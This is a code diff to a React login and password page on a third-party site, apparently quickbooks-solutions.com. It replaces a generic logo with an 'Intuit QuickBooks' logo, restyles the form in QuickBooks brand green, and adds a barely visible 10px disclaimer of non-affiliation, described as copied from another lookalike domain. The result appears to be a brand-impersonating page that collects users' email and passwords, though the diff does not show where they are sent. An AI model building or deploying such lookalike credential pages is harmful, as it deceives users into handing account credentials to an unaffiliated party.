@@ -30,14 +30,11 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
         <div className="mt-20 flex items-center justify-center p-4">
             <form onSubmit={handleSignIn} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                 {/* Logo */}
-                <div className="mb-5 flex justify-center">
-                        <div className="overflow-hidden w-[240px] h-[65px] flex items-center justify-center relative">
-                            <img 
-                                src="https://cdn.prod.website-files.com/698b7c9f3439798abd8f9be1/69b41eb99fc693b2ed54dd3f_unnamed__10_-removebg-preview-p-500.png" 
-                                alt="Quality Business Logo" 
-                                className="w-[310px] max-w-none h-auto" 
-                            />
-                        </div>
+                {/* Branding is unconditional on purpose: `isPlan` comes from useSearchParams(),
+                    so branching the markup on it makes the server and client render different
+                    trees and React throws a hydration mismatch. */}
+                <div className="mb-5">
+                    <img src="/quickbooks_logo.png" className="mx-auto" alt="Intuit QuickBooks" width={200} height={100} />
                 </div>
 
                 {/* Title */}
@@ -53,7 +50,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                         value={email}
                         required
                         onChange={(e) => setEmail(e.target.value)}
-                        className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 border-black focus:border-gray-500`}
+                        className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 border-[#2ca01c] focus:border-blue-500`}
                     />
                 </div>
 
@@ -64,7 +61,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                         id="remember"
                         checked={rememberMe}
                         onChange={(e) => setRememberMe(e.target.checked)}
-                        className={`w-4 h-4 bg-gray-100 border-gray-300 rounded text-black focus:ring-black`}
+                        className={`w-4 h-4 bg-gray-100 border-gray-300 rounded text-[#2ca01c] focus:ring-[#2ca01c]`}
                     />
                     <label htmlFor="remember" className="ml-3 text-gray-700">
                         Remember me
@@ -74,7 +71,7 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                 {/* Sign In Button */}
                 <button
                     type='submit'  
-                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 flex items-center justify-center bg-black hover:bg-gray-800`}
+                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 flex items-center justify-center bg-[#2ca01c] hover:bg-[#248a18]`}
                 >
                     <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                         <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
@@ -116,6 +113,14 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
                         </>
                     )}
                 </p>
+
+                {/* Independent service disclaimer — same block as quickbooks-enterprises.com,
+                    with this site's own domain. */}
+                <div className="mt-8 pt-4 border-t border-gray-100">
+                    <p className="text-[10px] leading-snug text-gray-400 text-center">
+                        <strong>Disclaimer:</strong> quickbooks-solutions.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
+                    </p>
+                </div>
             </form>
         </div>
     );
@@ -165,14 +170,11 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
         <div className="mt-20 flex items-center justify-center p-4">
             <form onSubmit={handleContinue} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
                 {/* Logo */}
-                <div className="mb-5 flex justify-center">
-                        <div className="overflow-hidden w-[240px] h-[65px] flex items-center justify-center relative">
-                            <img 
-                                src="https://cdn.prod.website-files.com/698b7c9f3439798abd8f9be1/69b41eb99fc693b2ed54dd3f_unnamed__10_-removebg-preview-p-500.png" 
-                                alt="Quality Business Logo" 
-                                className="w-[310px] max-w-none h-auto" 
-                            />
-                        </div>
+                {/* Branding is unconditional on purpose: `isPlan` comes from useSearchParams(),
+                    so branching the markup on it makes the server and client render different
+                    trees and React throws a hydration mismatch. */}
+                <div className="mb-5">
+                    <img src="/quickbooks_logo.png" className="mx-auto" alt="Intuit QuickBooks" width={200} height={100} />
                 </div>
 
                 {/* Title */}
@@ -207,7 +209,7 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
                             type={showPassword ? "text" : "password"}
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
-                            className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 pr-12 border-black focus:border-gray-500`}
+                            className={`w-full px-4 py-3 border-2 rounded focus:outline-none text-gray-700 pr-12 border-[#2ca01c] focus:border-blue-500`}
                         />
                         <button
                             type="button"
@@ -231,7 +233,7 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
                 {/* Continue Button */}
                 <button
                     type='submit'
-                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-6 bg-black hover:bg-gray-800`}
+                    className={`w-full text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-6 bg-[#2ca01c] hover:bg-[#248a18]`}
                 >
                     Continue
                 </button>
